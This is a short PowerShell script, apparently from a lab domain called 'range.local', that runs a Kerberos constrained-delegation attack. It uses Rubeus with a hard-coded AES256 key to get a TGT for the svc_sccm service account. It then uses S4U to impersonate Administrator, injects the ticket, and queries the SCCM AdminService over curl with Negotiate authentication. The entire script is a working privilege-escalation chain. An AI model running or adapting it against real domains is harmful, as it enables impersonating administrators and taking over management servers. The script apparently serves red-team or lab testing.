# In-session CD test: asktgt + s4u ptt + curl --negotiate (SAME session) — analyst_t1 (ws01)
$ErrorActionPreference = 'Continue'
$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$mp = 'mbr02.range.local'
$dc = 'dc03.range.local'
$tgtOut = 'C:\Users\analyst_t1\svc_sccm2.tgt.kirbi'

Write-Output '=== [1] asktgt svc_sccm ==='
& $rubeus asktgt /user:svc_sccm /domain:range.local /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /dc:$dc /outfile:$tgtOut 2>&1 | Select-Object -Last 4

Write-Output '=== [2] s4u as Administrator -> HTTP/mbr02.range.local (ptt) ==='
& $rubeus s4u /ticket:$tgtOut /impersonateuser:Administrator /msdsspn:HTTP/mbr02.range.local /altservice:HTTP /ptt /dc:$dc 2>&1 | Select-Object -Last 5

Write-Output '=== [3] curl --negotiate Device read (SAME session, ST in cache) ==='
curl.exe -k --negotiate -u : -s -o - -w "`nHTTP_CODE=%{http_code}`n" "https://$mp/AdminService/v1.0/Device(16777219)" 2>&1 | Select-Object -Last 15

Write-Output '=== [4] curl --negotiate root ==='
curl.exe -k --negotiate -u : -s -o - -w "`nHTTP_CODE=%{http_code}`n" "https://$mp/AdminService/v1.0/" 2>&1 | Select-Object -Last 8
Write-Output 'INSESSION_DONE'
